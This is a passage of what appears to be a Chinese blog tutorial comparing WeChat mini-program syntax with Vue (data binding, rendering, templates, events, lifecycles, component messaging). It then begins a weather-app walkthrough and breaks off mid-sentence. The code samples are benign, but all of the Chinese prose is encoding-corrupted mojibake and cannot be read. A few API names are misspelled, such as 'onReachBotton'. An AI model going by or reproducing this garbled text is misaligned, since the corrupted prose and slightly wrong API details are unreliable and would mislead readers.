ä¸‹é¢é’ˆå¯¹å°ç¨‹åºçš„æ•°æ®ç»‘å®šã€åˆ—è¡¨æ¸²æŸ“ã€æ¡ä»¶æ¸²æŸ“ã€æ¨¡æ¿ã€äº‹ä»¶å’Œåº”ç”¨è·Ÿ Vue ç±»æ¯”åŠ æ·±è®°å¿†ã€‚ æ•°æ®ç»‘å®šWXML ä¸­çš„åŠ¨æ€æ•°æ®å‡æ¥è‡ªå¯¹åº” Pageï¼ˆæˆ– Componentï¼‰ çš„ dataï¼Œè€Œåœ¨ Vueä¸­æ¥è‡ªå½“å‰ç»„ä»¶ã€‚ å°ç¨‹åºå’ŒVueçš„æ•°æ®ç»‘å®šéƒ½ä½¿ç”¨ Mustache è¯­æ³•ï¼ŒåŒæ‹¬å·å°†å˜é‡åŒ…èµ·æ¥ã€‚åŒºåˆ«æ˜¯ Vue ä¸­ä½¿ç”¨Mustache è¯­æ³•ä¸èƒ½ä½œç”¨åœ¨ HTML ç‰¹æ€§ä¸Š 1&lt;div v-bind:id="'list-' + id"&gt;&#123;&#123;msg&#125;&#125;&lt;/div&gt; è€Œå°ç¨‹åºä½œç”¨åœ¨æ ‡ç­¾å±žæ€§ä¸Š 1&lt;view id="item-&#123;&#123;id&#125;&#125;"&gt;&#123;&#123;msg&#125;&#125;&lt;/view&gt; åˆ—è¡¨æ¸²æŸ“Vue ä¸­ä½¿ç”¨ v-for æŒ‡ä»¤æ ¹æ®ä¸€ç»„æ•°ç»„çš„é€‰é¡¹åˆ—è¡¨ï¼Œä¹Ÿå¯ä»¥é€šè¿‡ä¸€ä¸ªå¯¹è±¡çš„å±žæ€§è¿­ä»£è¿›è¡Œæ¸²æŸ“ï¼Œä½¿ç”¨ (item, index) in items æˆ– (item, index) of items å½¢å¼ç‰¹æ®Šè¯­æ³•ã€‚ 12345&lt;ul&gt; &lt;li v-for="(item, index) in items"&gt; &#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125; &lt;/li&gt;&lt;/ul&gt; æ¸²æŸ“åŒ…å«å¤šä¸ªå…ƒç´ ï¼Œåˆ©ç”¨ &lt;template&gt;å…ƒç´  123456&lt;ul&gt; &lt;template v-for="(item, index) in items"&gt; &lt;li&gt;&#123;&#123; index &#125;&#125; - &#123;&#123; item.message &#125;&#125;&lt;/li&gt; &lt;li class="divider" role="presentation"&gt;&lt;/li&gt; &lt;/template&gt;&lt;/ul&gt; è€Œåœ¨å°ç¨‹åºä¸­ä½¿ç”¨ wx:for æŽ§åˆ¶å±žæ€§ç»‘å®šä¸€ä¸ªæ•°ç»„ï¼ˆå…¶å®žå¯¹è±¡ä¹Ÿå¯ä»¥ï¼‰ï¼Œé»˜è®¤æ•°ç»„çš„å½“å‰é¡¹çš„ä¸‹æ ‡å˜é‡ä¸º index ï¼Œå½“å‰é¡¹å˜é‡ä¸º itemã€‚ 1&lt;view wx:for="&#123;&#123;items&#125;&#125;"&gt; &#123;&#123;index&#125;&#125; - &#123;&#123;item.message&#125;&#125; &lt;/view&gt; ä¹Ÿå¯ä»¥ç”¨ wx:for-item æŒ‡å®šæ•°ç»„å½“å‰å…ƒç´ çš„å˜é‡åï¼Œç”¨ wx:for-index æŒ‡å®šæ•°ç»„å½“å‰ä¸‹æ ‡çš„å˜é‡åã€‚ 123&lt;view wx:for="&#123;&#123;items&#125;&#125;" wx:for-index="idx" wx:for-item="itemName"&gt; &#123;&#123;idx&#125;&#125;: &#123;&#123;itemName.message&#125;&#125;&lt;/view&gt; æ¸²æŸ“ä¸€ä¸ªåŒ…å«å¤šèŠ‚ç‚¹çš„ç»“æž„å—ï¼Œåˆ©ç”¨ &lt;block&gt; æ ‡ç­¾ 1234&lt;block wx:for="&#123;&#123;items&#125;&#125;"&gt; &lt;view&gt; &#123;&#123;index&#125;&#125; - &#123;&#123;item.message&#125;&#125; &lt;/view&gt; &lt;view class="divider" role="presentation"&gt;&lt;/view&gt;&lt;/block&gt; æ¡ä»¶æ¸²æŸ“Vue ä¸­ä½¿ç”¨v-ifã€v-else-ifã€v-elseæŒ‡ä»¤æ¡ä»¶æ¸²æŸ“ï¼Œå¤šä¸ªå…ƒç´ ä½¿ç”¨&lt;template&gt;åŒ…è£¹ï¼Œè€Œå°ç¨‹åºä¸­ä½¿ç”¨wx:ifã€wx:elseifã€wx:elseæ¥æ¡ä»¶æ¸²æŸ“ï¼Œå¤šä¸ªç»„ä»¶æ ‡ç­¾ä½¿ç”¨&lt;block&gt;åŒ…è£¹ã€‚ æ¨¡æ¿åœ¨ Vue ä¸­å®šä¹‰æ¨¡æ¿ä¸€ç§æ–¹å¼æ˜¯åœ¨ &lt;script&gt; å…ƒç´ ä¸­ï¼Œå¸¦ä¸Š text/x-template çš„ç±»åž‹ï¼Œç„¶åŽé€šè¿‡ä¸€ä¸ªidå°†æ¨¡æ¿å¼•ç”¨è¿‡åŽ»ã€‚ å®šä¹‰æ¨¡æ¿ï¼š 1234&lt;script type="text/x-template" id="hello-world-template"&gt; &lt;p&gt;Hello hello hello&lt;/p&gt; &lt;p&gt;&#123;&#123;msg&#125;&#125;&lt;/p&gt;&lt;/script&gt; ä½¿ç”¨æ¨¡æ¿ï¼š 12345678Vue.component('hello-world', &#123; template: '#hello-world-template', data () &#123; return &#123; msg: 'this is a template' &#125; &#125;&#125;) è€Œåœ¨å°ç¨‹åºä¸­ï¼Œåœ¨ &lt;template&gt; ä¸­ä½¿ç”¨ name å±žæ€§ä½œä¸ºæ¨¡æ¿åç§°ï¼Œä½¿ç”¨ is å±žæ€§å£°æ˜Žéœ€è¦ä½¿ç”¨çš„æ¨¡æ¿ï¼Œç„¶åŽå°†æ¨¡æ¿æ‰€éœ€çš„ data ä¼ å…¥ã€‚ å®šä¹‰æ¨¡æ¿ï¼š 1234&lt;template name="hello-world-template"&gt; &lt;view&gt;Hello hello hello&lt;/view&gt; &lt;view&gt;&#123;&#123;msg&#125;&#125;&lt;/view&gt;&lt;/template&gt; ä½¿ç”¨æ¨¡æ¿ï¼š 1&lt;template is="hello-world-template" data="&#123;&#123;...item&#125;&#125;"&gt;&lt;/template&gt; 1234567Page(&#123; data: &#123; item: &#123; msg: 'this is a template' &#125; &#125;&#125;) äº‹ä»¶åœ¨ Vue ä¸­ï¼Œç”¨ v-on æŒ‡ä»¤ç›‘å¬ DOM äº‹ä»¶ï¼Œå¹¶åœ¨è§¦å‘æ—¶è¿è¡Œä¸€äº› JavaScript ä»£ç ï¼Œå¯¹äºŽé˜»æ­¢äº‹ä»¶å†’æ³¡ã€äº‹ä»¶æ•èŽ·åˆ†åˆ«æä¾›äº‹ä»¶ä¿®é¥°ç¬¦.stopå’Œ.captureçš„å½¢å¼ 12345&lt;!-- é˜»æ­¢å•å‡»äº‹ä»¶ç»§ç»­ä¼ æ’­ --&gt;&lt;a v-on:click.stop="doThis"&gt;&lt;/a&gt;&lt;!-- æ·»åŠ äº‹ä»¶ç›‘å¬å™¨æ—¶ä½¿ç”¨äº‹ä»¶æ•èŽ·æ¨¡å¼ --&gt;&lt;!-- å³å…ƒç´ è‡ªèº«è§¦å‘çš„äº‹ä»¶å…ˆåœ¨æ­¤å¤„ç†ï¼Œç„¶åŽæ‰äº¤ç”±å†…éƒ¨å…ƒç´ è¿›è¡Œå¤„ç† --&gt;&lt;div v-on:click.capture="doThis"&gt;...&lt;/div&gt; è€Œåœ¨å°ç¨‹åºä¸­ï¼Œç»‘å®šäº‹ä»¶ä»¥ keyï¼Œvalue çš„å½¢å¼ï¼Œkey ä»¥ bind æˆ– catch å¼€å¤´ï¼Œç„¶åŽè·Ÿä¸Šäº‹ä»¶çš„ç±»åž‹ï¼Œå¦‚ bindtapã€catchtouchstartï¼Œä¹Ÿå¯ç´§è·Ÿä¸€ä¸ªå†’å·å½¢å¼ï¼Œå¦‚ bind:tapã€catch:touchstartã€‚bind äº‹ä»¶ç»‘å®šä¸ä¼šé˜»æ­¢å†’æ³¡äº‹ä»¶å‘ä¸Šå†’æ³¡ï¼Œcatch äº‹ä»¶ç»‘å®šå¯ä»¥é˜»æ­¢å†’æ³¡äº‹ä»¶å‘ä¸Šå†’æ³¡ã€‚ 1234&lt;!-- å•å‡»äº‹ä»¶å†’æ³¡ç»§ç»­ä¼ æ’­ --&gt;&lt;view bindtap="doThis"&gt;bindtap&lt;/view&gt;&lt;!-- é˜»æ­¢å•å‡»äº‹ä»¶å†’æ³¡ç»§ç»­ä¼ æ’­ --&gt;&lt;view catchtap="doThis"&gt;bindtap&lt;/view&gt; é‡‡ç”¨ capture-bindã€capture-catch åˆ†åˆ«æ•èŽ·äº‹ä»¶å’Œä¸­æ–­æ•èŽ·å¹¶å–æ¶ˆå†’æ³¡ã€‚ 1234&lt;!-- æ•èŽ·å•å‡»äº‹ä»¶ç»§ç»­ä¼ æ’­ --&gt;&lt;view capture-bind:tap="doThis"&gt;bindtap&lt;/view&gt;&lt;!-- æ•èŽ·å•å‡»äº‹ä»¶é˜»æ­¢ç»§ç»­ä¼ æ’­ï¼Œå¹¶ä¸”é˜»æ­¢å†’æ³¡ --&gt;&lt;view capture-catch="doThis"&gt;bindtap&lt;/view&gt; å¼•ç”¨åœ¨ Vue ä¸­å¼•ç”¨ç”¨äºŽç»„ä»¶çš„æœç”¨å¼•å…¥ 12import ComponentA from './ComponentA'import ComponentC from './ComponentC' åœ¨å°ç¨‹åºä¸­ï¼ŒWXML æä¾›ä¸¤ç§å¼•ç”¨æ–¹å¼ import å’Œ includeã€‚ åœ¨ item.wxml ä¸­å®šä¹‰äº†ä¸€ä¸ªå«itemçš„templateï¼š 1234&lt;!-- item.wxml --&gt;&lt;template name="item"&gt; &lt;text&gt;&#123;&#123;text&#125;&#125;&lt;/text&gt;&lt;/template&gt; åœ¨ index.wxml ä¸­å¼•ç”¨äº† item.wxmlï¼Œå°±å¯ä»¥ä½¿ç”¨itemæ¨¡æ¿ï¼š 1&lt;import src="item.wxml" /&gt; &lt;template is="item" data="&#123;&#123;text: 'forbar'&#125;&#125;" /&gt; include å¯ä»¥å°†ç›®æ ‡æ–‡ä»¶é™¤äº† &lt;template&gt; &lt;wxs&gt; å¤–æ•´ä¸ªä»£ç å¼•å…¥: 123456&lt;!-- index.wxml --&gt;&lt;include src="header.wxml" /&gt; &lt;view&gt; body &lt;/view&gt; &lt;include src="footer.wxml" /&gt;&lt;!-- header.wxml --&gt;&lt;view&gt; header &lt;/view&gt;&lt;!-- footer.wxml --&gt;&lt;view&gt; footer &lt;/view&gt; WXSS æ ·å¼WXSS(WeiXin Style Sheets) å…·æœ‰ CSS å¤§éƒ¨åˆ†çš„ç‰¹æ€§ï¼Œä¹Ÿåšäº†ä¸€äº›æ‰©å……å’Œä¿®æ”¹ã€‚ å°ºå¯¸å•ä½rpxæ”¯æŒæ–°çš„å°ºå¯¸å•ä½ rpxï¼Œæ ¹æ®å±å¹•å®½åº¦è‡ªé€‚åº”ï¼Œè§„å®šå±å¹•å®½ä¸º750rpxï¼Œå…åŽ»å¼€å‘æ¢ç®—çš„çƒ¦æ¼ï¼ˆé‡‡ç”¨æµ®ç‚¹è®¡ç®—ï¼Œå’Œé¢„æœŸç»“æžœä¼šæœ‰ç‚¹åå·®ï¼‰ã€‚ è®¾å¤‡ rpxæ¢ç®—pxï¼ˆå±å®½/750ï¼‰ pxæ¢ç®—rpxï¼ˆ750/å±å®½ï¼‰ iPhone5 1rpx = 0.42px 1px = 2.34rpx iPhone6 1rpx = 0.5px 1px = 2rpx iPhone6 Plus 1rpx = 0.552px 1px = 1.81rpx iPhone6ä¸Šï¼Œæ¢ç®—ç›¸å¯¹æœ€ç®€å•ï¼Œ1rpx = 0.5px = 1ç‰©ç†åƒç´ ï¼Œå»ºè®®è®¾è®¡å¸ˆä»¥ iPhone6 ä¸ºè®¾è®¡ç¨¿ã€‚ æ ·å¼å¯¼å…¥ä½¿ç”¨ @import è¯­å¥å¯¼å…¥å¤–è”æ ·å¼è¡¨ï¼Œæ³¨æ„è·¯å¾„ä¸ºç›¸å¯¹è·¯å¾„ã€‚ å…¨å±€æ ·å¼ä¸Žå±€éƒ¨æ ·å¼app.wxssä¸­çš„æ ·å¼ä¸ºå…¨å±€æ ·å¼ï¼Œåœ¨ Page ï¼ˆæˆ– Componentï¼‰ çš„ wxssæ–‡ä»¶ä¸­å®šä¹‰çš„æ ·å¼ä¸ºå±€éƒ¨æ ·å¼ï¼Œè‡ªä½œç”¨åœ¨å¯¹åº”é¡µé¢ï¼Œå¹¶ä¼šè¦†ç›– app.wxss ä¸­ç›¸åŒé€‰æ‹©å™¨ã€‚ é¡µé¢æ³¨å†Œå°ç¨‹åºæ˜¯ä»¥ Page(Object) æž„é€ é¡µé¢ç‹¬ç«‹çŽ¯å¢ƒï¼ŒappåŠ è½½åŽï¼Œåˆå§‹åŒ–æŸä¸ªé¡µé¢ï¼Œç±»ä¼¼äºŽ Vue çš„å®žä¾‹åŒ–è¿‡ç¨‹ï¼Œæœ‰è‡ªå·±çš„åˆå§‹æ•°æ®ã€ç”Ÿå‘½å‘¨æœŸå’Œäº‹ä»¶å¤„ç†å›žè°ƒå‡½æ•°ã€‚ åˆå§‹åŒ–æ•°æ®å’Œ Vue ä¸€æ ·ï¼Œåœ¨æž„é€ å®žä¾‹å±žæ€§ä¸Šéƒ½æœ‰ä¸€ä¸ª data å¯¹è±¡ï¼Œä½œä¸ºåˆå§‹æ•°æ®ã€‚ Vue ä¸­ä¿®æ”¹ data ä¸­æŸä¸ªå±žæ€§å€¼ç›´æŽ¥èµ‹å€¼å³å¯ï¼Œè€Œåœ¨å°ç¨‹åºä¸­éœ€è¦ä½¿ç”¨ Page çš„å®žä¾‹æ–¹æ³• setData(Object data, Function callback) æ‰èµ·ä½œç”¨ï¼Œä¸éœ€è¦åœ¨ this.data ä¸­é¢„å…ˆå®šä¹‰ï¼Œå•æ¬¡è®¾ç½®æ•°æ®å¤§å°ä¸å¾—è¶…è¿‡1024kbã€‚ æ”¯æŒä»¥æ•°æ®è·¯å¾„çš„å½¢å¼æ”¹å˜æ•°ç»„æŸé¡¹æˆ–å¯¹è±¡æŸé¡¹å±žæ€§ï¼š 1234// å¯¹äºŽå¯¹è±¡æˆ–æ•°ç»„å­—æ®µï¼Œå¯ä»¥ç›´æŽ¥ä¿®æ”¹ä¸€ä¸ªå…¶ä¸‹çš„å­å­—æ®µï¼Œè¿™æ ·åšé€šå¸¸æ¯”ä¿®æ”¹æ•´ä¸ªå¯¹è±¡æˆ–æ•°ç»„æ›´å¥½ this.setData(&#123; 'array[0].text': 'changed data' &#125;) ç”Ÿå‘½å‘¨æœŸå›žè°ƒå‡½æ•°æ¯ä¸ª Vue å®žä¾‹åœ¨è¢«åˆ›å»ºæ—¶éƒ½è¦ç»è¿‡ä¸€ç³»åˆ—çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œæ¯ä¸€ä¸ªé˜¶æ®µéƒ½æœ‰ç›¸åº”é’©å­å‡½æ•°è¢«è°ƒç”¨ï¼Œcreated mounted updated destroyedã€‚ å¯¹äºŽå°ç¨‹åºç”Ÿå‘½å‘¨æœŸï¼Œåˆ†ä¸º Page çš„ç”Ÿå‘½å‘¨æœŸå’Œ Component çš„ç”Ÿå‘½å‘¨æœŸã€‚ Page çš„ç”Ÿå‘½å‘¨æœŸå›žè°ƒå‡½æ•°æœ‰ï¼š onLoad ç”Ÿå‘½å‘¨æœŸå›žè°ƒ-ç›‘å¬é¡µé¢åŠ è½½ onShow ç”Ÿå‘½å‘¨æœŸå›žè°ƒ-ç›‘å¬é¡µé¢æ˜¾ç¤º onReady ç”Ÿå‘½å‘¨æœŸå›žè°ƒ-ç›‘å¬é¡µé¢åˆæ¬¡æ¸²æŸ“å®Œæˆ onHide ç”Ÿå‘½å‘¨æœŸå›žè°ƒ-ç›‘å¬é¡µé¢éšè— onUnload ç”Ÿå‘½å‘¨æœŸå›žè°ƒ-ç›‘å¬é¡µé¢å¸è½½ onPullDownRefreshç›‘å¬ç”¨æˆ·ä¸‹æ‹‰åŠ¨ä½œ onReachBotton é¡µé¢ä¸Šæ‹‰è§¦åº•äº‹ä»¶çš„å¤„ç†å‡½æ•° onShareAppMessage ç”¨æˆ·ç‚¹å‡»å³ä¸Šè§’è½¬å‘ onPageScroll é¡µé¢æ»šåŠ¨è§¦å‘äº‹ä»¶çš„å¤„ç†å‡½æ•° onTabItemTap å½“å‰æ˜¯ tab é¡µæ—¶ï¼Œç‚¹å‡» tab è§¦å‘ Component çš„ç”Ÿå‘½å‘¨æœŸæœ‰ï¼š created åœ¨ç»„ä»¶å®žä¾‹åˆšåˆšè¢«åˆ›å»ºæ—¶æ‰§è¡Œ attached åœ¨ç»„ä»¶å®žä¾‹è¿›å…¥é¡µé¢èŠ‚ç‚¹æ ‘æ—¶æ‰§è¡Œ ready åœ¨ç»„ä»¶åœ¨è§†å›¾å±‚å¸ƒå±€å®ŒæˆåŽæ‰§è¡Œ moved åœ¨ç»„ä»¶å®žä¾‹è¢«ç§»åŠ¨åˆ°èŠ‚ç‚¹æ ‘å¦ä¸€ä¸ªä½ç½®æ—¶æ‰§è¡Œ detached åœ¨ç»„ä»¶å®žä¾‹è¢«ä»Žé¡µé¢èŠ‚ç‚¹æ ‘ç§»é™¤æ—¶æ‰§è¡Œ error æ¯å½“ç»„ä»¶æ–¹æ³•æŠ›å‡ºé”™è¯¯æ—¶æ‰§è¡Œ show ç»„ä»¶æ‰€åœ¨çš„é¡µé¢è¢«å±•ç¤ºæ—¶æ‰§è¡Œ hide ç»„ä»¶æ‰€åœ¨çš„é¡µé¢è¢«éšè—æ—¶æ‰§è¡Œ resize ç»„ä»¶æ‰€åœ¨çš„é¡µé¢å°ºå¯¸å˜åŒ–æ—¶æ‰§è¡Œ wxsWXSï¼ˆWeiXin Scriptï¼‰æ˜¯å°ç¨‹åºçš„ä¸€å¥—è„šæœ¬è¯­è¨€ï¼Œç»“åˆ WXMLï¼Œå¯ä»¥æž„å»ºå‡ºé¡µé¢çš„ç»“æž„ã€‚wxs çš„è¿è¡ŒçŽ¯å¢ƒå’Œå…¶ä»– JavaScript ä»£ç æ˜¯éš”ç¦»çš„ï¼Œwxs ä¸­ä¸èƒ½è°ƒç”¨å…¶ä»– JavaScript æ–‡ä»¶ä¸­å®šä¹‰çš„å‡½æ•°ï¼Œä¹Ÿä¸èƒ½è°ƒç”¨å°ç¨‹åºæä¾›çš„APIã€‚ä»Žè¯­æ³•ä¸Šçœ‹ï¼Œå¤§éƒ¨åˆ†å’Œ JavaScriptæ˜¯ä¸€æ ·çš„ï¼Œä»¥ä¸‹åˆ—å‡ºä¸€äº›æ³¨æ„ç‚¹å’Œå·®åˆ«ï¼š &lt;wxs&gt; æ¨¡å—åªèƒ½åœ¨å®šä¹‰æ¨¡å—çš„ WXML æ–‡ä»¶ä¸­è¢«è®¿é—®ã€‚ä½¿ç”¨ &lt;include&gt; æˆ– &lt;import&gt; æ—¶ï¼Œ &lt;wxs&gt; æ¨¡å—ä¸ä¼šè¢«å¼•ç”¨åˆ°å¯¹åº”çš„ WXML æ–‡ä»¶ä¸­ï¼› &lt;template&gt; æ ‡ç­¾ä¸­ï¼Œåªèƒ½ä½¿ç”¨å®šä¹‰è¯¥&lt;template&gt; çš„ WXML æ–‡ä»¶ä¸­å®šä¹‰çš„ &lt;wxs&gt; æ¨¡å—ï¼› Dateå¯¹è±¡ï¼Œéœ€è¦ä½¿ç”¨ getDate å‡½æ•°ï¼Œè¿”å›žä¸€ä¸ªå½“å‰æ—¶é—´çš„å¯¹è±¡ï¼› RegExpå¯¹è±¡ï¼Œä½¿ç”¨ getRegExp å‡½æ•°ï¼› ä½¿ç”¨ constructor å±žæ€§åˆ¤æ–­æ•°æ®ç±»åž‹ã€‚ ç»„ä»¶é—´é€šä¿¡å°ç¨‹åºç»„ä»¶é—´é€šä¿¡å’ŒVue ç»„ä»¶é—´é€šä¿¡å¾ˆç›¸ä¼¼ çˆ¶ç»„ä»¶ä¼ å€¼åˆ°å­ç»„ä»¶åœ¨ Vue ä¸­ï¼Œçˆ¶ç»„ä»¶å®šä¹‰ä¸€äº›è‡ªå®šä¹‰ç‰¹æ€§ï¼Œå­ç»„ä»¶é€šè¿‡ props å®žä¾‹å±žæ€§èŽ·å–ï¼Œä¹Ÿå¯é€šè¿‡ wm.$refs å¯ä»¥èŽ·å–å­ç»„ä»¶èŽ·å–å­ç»„ä»¶æ‰€æœ‰å±žæ€§å’Œæ–¹æ³•ã€‚ 12&lt;!-- çˆ¶ç»„ä»¶ --&gt;&lt;blog-post title="A title"&gt;&lt;/blog-post&gt; 12345&lt;!-- å­ç»„ä»¶ --&gt;&lt;h3&gt;&#123;&#123; postTitle &#125;&#125;&lt;/h3&gt;export default &#123; props: ['postTitle']&#125; åŒæ ·çš„ï¼Œåœ¨å°ç¨‹åºä¸­ï¼Œçˆ¶ç»„ä»¶å®šä¹‰ä¸€äº›ç‰¹æ€§ï¼Œå­ç»„ä»¶é€šè¿‡ properties å®žä¾‹å±žæ€§èŽ·å–ï¼Œä¸åŒçš„æ˜¯ï¼Œæä¾›äº† observer å›žè°ƒå‡½æ•°ï¼Œå¯ä»¥ç›‘å¬ä¼ é€’å€¼çš„å˜åŒ–ã€‚çˆ¶ç»„ä»¶è¿˜å¯ä»¥é€šè¿‡ this.selectComponent æ–¹æ³•èŽ·å–å­ç»„ä»¶å®žä¾‹å¯¹è±¡ï¼Œè¿™æ ·å°±å¯ä»¥ç›´æŽ¥è®¿é—®ç»„ä»¶çš„ä»»æ„æ•°æ®å’Œæ–¹æ³•ã€‚ 12345678910111213Component(&#123; properties: &#123; myProperty: &#123; // å±žæ€§å type: String, // ç±»åž‹ï¼ˆå¿…å¡«ï¼‰ï¼Œç›®å‰æŽ¥å—çš„ç±»åž‹åŒ…æ‹¬ï¼šString, Number, Boolean, Object, Array, nullï¼ˆè¡¨ç¤ºä»»æ„ç±»åž‹ï¼‰ value: '', // å±žæ€§åˆå§‹å€¼ï¼ˆå¯é€‰ï¼‰ï¼Œå¦‚æžœæœªæŒ‡å®šåˆ™ä¼šæ ¹æ®ç±»åž‹é€‰æ‹©ä¸€ä¸ª observer(newVal, oldVal, changedPath) &#123; // å±žæ€§è¢«æ”¹å˜æ—¶æ‰§è¡Œçš„å‡½æ•°ï¼ˆå¯é€‰ï¼‰ï¼Œä¹Ÿå¯ä»¥å†™æˆåœ¨methodsæ®µä¸­å®šä¹‰çš„æ–¹æ³•åå­—ç¬¦ä¸², å¦‚ï¼š'_propertyChange' // é€šå¸¸ newVal å°±æ˜¯æ–°è®¾ç½®çš„æ•°æ®ï¼Œ oldVal æ˜¯æ—§æ•°æ® &#125; &#125;, myProperty2: String // ç®€åŒ–çš„å®šä¹‰æ–¹å¼ &#125;&#125;) å­ç»„ä»¶ä¼ å€¼åˆ°çˆ¶ç»„ä»¶åœ¨Vue ä¸­é€šè¿‡è‡ªå®šä¹‰äº‹ä»¶ç³»ç»Ÿè§¦å‘ vm.$emit( eventName, [â€¦args] ) å›žè°ƒä¼ å‚å®žçŽ°ã€‚ 1234&lt;!-- å­ç»„ä»¶ --&gt;&lt;button v-on:click="$emit('enlarge-text')"&gt; Enlarge text&lt;/button&gt; 12345&lt;!-- çˆ¶ç»„ä»¶ --&gt;&lt;blog-post ... v-on:enlarge-text="postFontSize += 0.1"&gt;&lt;/blog-post&gt; åŒæ ·çš„ï¼Œåœ¨å°ç¨‹åºä¸­ä¹Ÿæ˜¯é€šè¿‡è§¦å‘è‡ªå®šä¹‰äº‹ä»¶ triggerEvent å›žè°ƒä¼ å‚å½¢å¼å®žçŽ°å­ç»„ä»¶å‘çˆ¶ç»„ä»¶ä¼ é€’æ•°æ®ã€‚ 12&lt;!-- page.wxml --&gt;&lt;my-component bindcustomevent="pageEventListener2"&gt;&lt;/my-component&gt; 12345678// my-component.jsComponent(&#123; methods: &#123; onTap () &#123; this.triggerEvent('customevent', &#123;&#125;) &#125; &#125;&#125;) å¤©æ°”é¢„æŠ¥å°ç¨‹åºè¯´äº†å¾ˆå¤šå°ç¨‹åºå¼€å‘çš„åŸºç¡€å‡†å¤‡ï¼Œä¸‹é¢å°±ç»“åˆä¸ªäººå®žé™…ç»ƒæ‰‹é¡¹ç›®â€”â€”å¤©æ°”é¢„æŠ¥å°ç¨‹åºç®€å•è¯´æ˜Žã€‚ ç‰©æ–™å‡†å¤‡ä»Žéœ€æ±‚ç»“æžœå¯¼å‘ï¼Œå¤©æ°”ç¨‹åºé¦–å…ˆè¦èƒ½èŽ·å–åˆ°å½“å‰æ‰€åœ¨åœ°å¤©æ°”çŠ¶å†µï¼Œå†æ¬¡å¯ä»¥è‡ªç”±é€‰æ‹©æŸåœ°ï¼ŒçŸ¥é“å…¶å¤©æ°”çŠ¶å†µã€‚è¿™æ ·å°±éœ€è¦æœ‰èŽ·å–å¤©æ°”çš„APIå’Œæœç´¢åœ°å€APIã€‚ æœé›†äº†å¾ˆå¤šå…è´¹å¤©æ°”APIï¼Œæœ€ç»ˆé€‰ä¸­å’Œé£Žå¤©æ°”ï¼ŒåŽŸå› å¾ˆç®€å•ï¼Œå®ƒæä¾›è®¤è¯ä¸ªäººå¼€å‘è€…ç”³è¯·ï¼Œæ‹¥æœ‰æ›´å¤šä½¿ç”¨åŠŸèƒ½å’Œè°ƒç”¨æ¬¡æ•°ã€‚ åœ°å€æœç´¢å’ŒåŸŽå¸‚é€‰æ‹©èƒ½åŠ›é€‰ç”¨å¾®ä¿¡è‡ªå®¶äº§å“è…¾è®¯ä½ç½®æœåŠ¡å¾®ä¿¡å°ç¨‹åºJavaScript SDKã€‚ å¼€å‘å‰ç‰©æ–™ï¼ˆæœåŠ¡èƒ½åŠ›ï¼‰å‡†å¤‡å¥½äº†ï¼ŒæŽ¥ä¸‹æ¥å°±æ˜¯æ’¸å°ç¨‹åºäº†ï¼ é¦–é¡µèŽ·å–ç”¨æˆ·ä¿¡æ¯ã€å¸ƒå±€ç›¸å…³å¸ƒå±€å¾®ä¿¡å°ç¨‹åºçš„æ ·å¼å·²æ”¯æŒå¤§éƒ¨åˆ† CSS ç‰¹æ€§ï¼Œä¸ç”¨å†åŽ»è€ƒè™‘å¤ªå¤šä¼ ç»Ÿæµè§ˆå™¨å…¼å®¹æ€§é—®é¢˜äº†ï¼Œå¸ƒå±€æ–¹ä¾¿ç›´æŽ¥é€‰ç”¨ flex å¸ƒå±€ã€‚æ¯”å¦‚ï¼š 1234567/**app.wxss**/page &#123; background: #f6f6f6; display: flex; flex-direction: column; justify-content: flex-start;&#125; èŽ·å–ç”¨æˆ·ä¿¡æ¯é¦–é¡µé¦–æ¬¡åŠ è½½èŽ·å–ç”¨æˆ·ï¼Œé€šå¸¸ä¼šå¼¹çª—æç¤ºæ˜¯å¦å…è®¸èŽ·å–ç”¨æˆ·ä¿¡æ¯ï¼Œç”¨æˆ·ç‚¹å‡»å…è®¸èŽ·å–æŽˆæƒï¼Œæ‰èƒ½æˆåŠŸèŽ·å–ç”¨æˆ·ä¿¡æ¯ï¼Œå±•ç¤ºç”¨æˆ·åå’Œç”¨æˆ·å¤´åƒç­‰ï¼Œå°ç¨‹åºä¸ºäº†ä¼˜åŒ–ç”¨æˆ·ä½“éªŒï¼Œä½¿ç”¨ wx.getUserInfo æŽ¥å£ç›´æŽ¥å¼¹å‡ºæŽˆæƒæ¡†çš„å¼€å‘æ–¹å¼å°†é€æ­¥ä¸å†æ”¯æŒã€‚ç›®å‰å¼€å‘çŽ¯å¢ƒä¸å¼¹çª—äº†ï¼Œæ­£å¼ç‰ˆæš‚ä¸å—å½±å“ã€‚æå€¡ä½¿ç”¨ button ç»„ä»¶ï¼ŒæŒ‡å®š open-type ä¸º getUserInfoç±»åž‹ï¼Œç”¨æˆ·ä¸»åŠ¨ç‚¹å‡»åŽæ‰å¼¹çª—ã€‚å¤©æ°”å°ç¨‹åºèŽ·å–ç”¨æˆ·å¤´åƒå’Œç”¨æˆ·åé‡‡ç”¨çš„æ˜¯å¦ä¸€ç§æ–¹å¼ï¼Œä½¿ç”¨open-data å¯ä»¥ç›´æŽ¥èŽ·å–ç”¨æˆ·åŸºç¡€ä¿¡æ¯ï¼Œä¸ç”¨å¼¹çª—æç¤ºã€‚ 123456 &lt;!-- ç”¨æˆ·ä¿¡æ¯ --&gt; &lt;view class="userinfo"&gt; &lt;open-data type="userAvatarUrl" class="userinfo-avatar"/&gt; &lt;text class="userinfo-nickname"&gt;&#123;&#123;greetings&#125;&#125;ï¼Œ&lt;/text&gt; &lt;open-data type="userNickName"/&gt;&lt;/view&gt; åŸŽå¸‚æ‹¼éŸ³é¦–å­—æ¯é”šç‚¹ ä¸Šä¸‹æ»‘åŠ¨åŸŽå¸‚åˆ—è¡¨ï¼Œå½“æ»‘è¿‡å½“å‰å¯è§†åŒºçš„åŸŽå¸‚æ‹¼éŸ³é¦–å­—æ¯ï¼Œå³ä¾§å­—æ¯ç´¢å¼•æ å¯¹åº”çš„å­—æ¯ä¹Ÿä¼šåˆ‡æ¢åˆ°é«˜äº®æ˜¾ç¤ºã€‚ è¦æ»¡è¶³å½“å‰çš„è¿™ä¸ªåœºæ™¯éœ€æ±‚ï¼Œé¦–å…ˆè¦ä¸ºåŸŽå¸‚åˆ—è¡¨çš„æ‹¼éŸ³é¦–å­—æ¯æ ‡é¢˜æ·»åŠ æ ‡å¿—ï¼ˆidï¼‰ï¼Œå½“&lt;scroll-view&gt;æ»šåŠ¨è§¦å‘æ—¶èŽ·å–å„ä¸ªæ ‡å¿—ä½è·ç¦»è§†çª—é¡¶éƒ¨çš„ä½ç½®ï¼Œæ­¤å¤„ç”¨åˆ°å°ç¨‹åº WXML èŠ‚ç‚¹API NodesRef.boundingClientRect(function 